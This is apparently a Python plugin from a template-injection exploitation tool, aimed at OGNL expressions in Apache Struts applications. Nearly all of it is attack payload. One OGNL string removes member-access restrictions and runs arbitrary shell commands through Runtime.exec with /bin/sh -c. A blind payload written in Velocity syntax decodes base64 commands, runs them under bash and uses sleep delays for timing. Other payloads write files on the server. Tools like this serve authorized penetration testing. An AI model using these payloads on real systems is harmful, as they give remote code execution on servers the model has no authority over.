from utils.loggers import log
from plugins.languages import java
from utils import rand
from utils.strings import quote
import re

class Ognl(java.Java):
    
    def init(self):

        self.update_actions({
            'render' : {
                'render': '${%(code)s}',
                'header': '${"%(header)s"}',
                'trailer': '${"%(trailer)s"}',
                'test_render': '"%(s1)s".toString().replace("%(c1)s", "%(s2)s")' % { 
                    's1' : rand.randstrings[0],
                    'c1' : rand.randstrings[0][0],
                    's2' : rand.randstrings[1],
                },
                'test_render_expected': '%(res)s' % { 
                    'res' :  rand.randstrings[0].replace(rand.randstrings[0][0], rand.randstrings[1])
                }
            },
            'write' : {
                'call' : 'inject',
                'write' : """Files.write(Paths.get("./fileName.txt"), text.getBytes());""",
                'truncate' : """Files.write(Paths.get("./fileName.txt"), text.getBytes());"""
            },
            'execute' : {

                'call': 'render',
                'execute': """#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,#wwww=@java.lang.Runtime@getRuntime(),#ssss=new java.lang.String[3],#ssss[0]="/bin/sh",#ssss[1]="-c",#ssss[2]="%(code)s",#wwww.exec(#ssss),#kzxs=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#kzxs.close(),1?#xx:#request.toString""" 
            },
            'execute_blind' : {
                'call': 'inject',
                'execute_blind': """#set($engine="")
#set($run=$engine.getClass().forName("java.lang.Runtime"))
#set($runtime=$run.getRuntime())
#set($proc=$runtime.exec("bash -c {eval,$({tr,/+,_-}<<<%(code_b64)s|{base64,--decode})}&&{sleep,%(delay)s}"))
#set($null=$proc.waitFor())
#set($istr=$proc.getInputStream())
#set($chr=$engine.getClass().forName("java.lang.Character"))
#set($output="")
#set($string=$engine.getClass().forName("java.lang.String"))
#foreach($i in [1..$istr.available()])
#set($output=$output.concat($string.valueOf($chr.toChars($istr.read()))))
#end
${output}
"""
            }
        })

        self.set_contexts([

                # Text context, no closures
                { 'level': 0 },

                { 'level': 1, 'prefix': '%(closure)s)', 'suffix' : '', 'closures' : java.ctx_closures },

                # This catches
                # #if(%s == 1)\n#end
                # #foreach($item in %s)\n#end
                # #define( %s )a#end
                { 'level': 3, 'prefix': '%(closure)s#end#if(1==1)', 'suffix' : '', 'closures' : java.ctx_closures },
                { 'level': 5, 'prefix': '*#', 'suffix' : '#*' },

        ])